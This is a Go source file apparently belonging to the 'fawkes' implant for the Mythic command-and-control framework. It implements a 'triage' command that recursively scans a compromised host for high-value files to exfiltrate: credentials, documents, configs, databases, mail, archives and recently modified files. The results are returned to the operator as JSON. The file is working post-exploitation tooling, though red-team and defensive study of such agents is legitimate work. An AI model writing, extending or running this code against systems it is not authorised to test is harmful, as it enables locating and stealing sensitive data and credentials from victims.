package commands

import (
	"encoding/json"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"fawkes/pkg/structs"
)

// TriageCommand scans for high-value files across common locations.
type TriageCommand struct{}

func (c *TriageCommand) Name() string        { return "triage" }
func (c *TriageCommand) Description() string { return "Find high-value files for exfiltration" }

// flexInt accepts both integer and string-encoded integer in JSON.
// Mythic UI sends numbers but manual JSON may send strings.
type flexInt int

func (f *flexInt) UnmarshalJSON(b []byte) error {
	var n int
	if err := json.Unmarshal(b, &n); err == nil {
		*f = flexInt(n)
		return nil
	}
	var s string
	if err := json.Unmarshal(b, &s); err == nil {
		n, err := strconv.Atoi(s)
		if err != nil {
			return fmt.Errorf("flexInt: cannot parse %q as int", s)
		}
		*f = flexInt(n)
		return nil
	}
	return fmt.Errorf("flexInt: expected int or string, got %s", string(b))
}

type triageArgs struct {
	Action   string  `json:"action"`
	MaxSize  int64   `json:"max_size"`
	MaxFiles int     `json:"max_files"`
	Path     string  `json:"path"`
	Hours    flexInt `json:"hours"` // for 'recent' action: time window in hours (default: 24)
}

type triageResult struct {
	Path     string `json:"path"`
	Size     int64  `json:"size"`
	ModTime  string `json:"modified"`
	Category string `json:"category"`
}

func (c *TriageCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[triageArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Action == "" {
		args.Action = "all"
	}
	if args.MaxSize == 0 {
		args.MaxSize = 10 * 1024 * 1024 // 10MB default
	}
	if args.MaxFiles == 0 {
		args.MaxFiles = 200
	}

	var results []triageResult

	switch args.Action {
	case "all":
		results = triageAll(task, args)
	case "documents":
		results = triageDocuments(task, args)
	case "credentials":
		results = triageCredentials(task, args)
	case "configs":
		results = triageConfigs(task, args)
	case "recent":
		results = triageRecent(task, args)
	case "database":
		results = triageDatabase(task, args)
	case "scripts":
		results = triageScripts(task, args)
	case "archives":
		results = triageArchives(task, args)
	case "mail":
		results = triageMail(task, args)
	case "custom":
		if args.Path == "" {
			return errorResult("Error: -path required for custom triage")
		}
		results = triageCustom(task, args)
	default:
		return errorf("Unknown action: %s. Use: all, documents, credentials, configs, database, scripts, archives, mail, recent, custom", args.Action)
	}

	if task.DidStop() {
		return successf("Triage cancelled. Found %d files before stop.", len(results))
	}

	if len(results) == 0 {
		return successResult("[]")
	}

	data, err := json.Marshal(results)
	if err != nil {
		return errorf("Error marshaling output: %v", err)
	}

	return successResult(string(data))
}

func triageAll(task structs.Task, args triageArgs) []triageResult {
	var results []triageResult
	results = append(results, triageDocuments(task, args)...)
	if task.DidStop() || len(results) >= args.MaxFiles {
		return results
	}
	results = append(results, triageCredentials(task, args)...)
	if task.DidStop() || len(results) >= args.MaxFiles {
		return results
	}
	results = append(results, triageConfigs(task, args)...)
	return results
}

// triageScan scans paths for files matching extensions.
func triageScan(task structs.Task, paths []string, extensions []string, category string, args triageArgs, maxDepth int) []triageResult {
	extMap := make(map[string]bool)
	for _, ext := range extensions {
		extMap[strings.ToLower(ext)] = true
	}

	var results []triageResult
	for _, basePath := range paths {
		if task.DidStop() || len(results) >= args.MaxFiles {
			break
		}
		baseDepth := strings.Count(basePath, string(os.PathSeparator))
		_ = filepath.WalkDir(basePath, func(path string, d fs.DirEntry, err error) error {
			if task.DidStop() || len(results) >= args.MaxFiles {
				return fmt.Errorf("limit")
			}
			if err != nil {
				return nil
			}
			depth := strings.Count(path, string(os.PathSeparator)) - baseDepth
			if depth > maxDepth && d.IsDir() {
				return filepath.SkipDir
			}
			if d.IsDir() {
				return nil
			}
			info, infoErr := d.Info()
			if infoErr != nil {
				return nil
			}
			if info.Size() > args.MaxSize || info.Size() == 0 {
				return nil
			}
			ext := strings.ToLower(filepath.Ext(filepath.Base(path)))
			if extMap[ext] {
				results = append(results, triageResult{
					Path:     path,
					Size:     info.Size(),
					ModTime:  info.ModTime().Format("2006-01-02 15:04"),
					Category: category,
				})
			}
			return nil
		})
	}
	return results
}

// triageScanPatterns scans paths for files matching glob patterns.
func triageScanPatterns(task structs.Task, paths []string, patterns []string, category string, args triageArgs, maxDepth int) []triageResult {
	var results []triageResult
	for _, basePath := range paths {
		if task.DidStop() || len(results) >= args.MaxFiles {
			break
		}
		baseDepth := strings.Count(basePath, string(os.PathSeparator))
		_ = filepath.WalkDir(basePath, func(path string, d fs.DirEntry, err error) error {
			if task.DidStop() || len(results) >= args.MaxFiles {
				return fmt.Errorf("limit")
			}
			if err != nil {
				return nil
			}
			depth := strings.Count(path, string(os.PathSeparator)) - baseDepth
			if depth > maxDepth && d.IsDir() {
				return filepath.SkipDir
			}
			if d.IsDir() {
				return nil
			}
			info, infoErr := d.Info()
			if infoErr != nil {
				return nil
			}
			if info.Size() > args.MaxSize || info.Size() == 0 {
				return nil
			}
			name := filepath.Base(path)
			for _, pattern := range patterns {
				if matched, _ := filepath.Match(pattern, name); matched {
					results = append(results, triageResult{
						Path:     path,
						Size:     info.Size(),
						ModTime:  info.ModTime().Format("2006-01-02 15:04"),
						Category: category,
					})
					break
				}
			}
			return nil
		})
	}
	return results
}
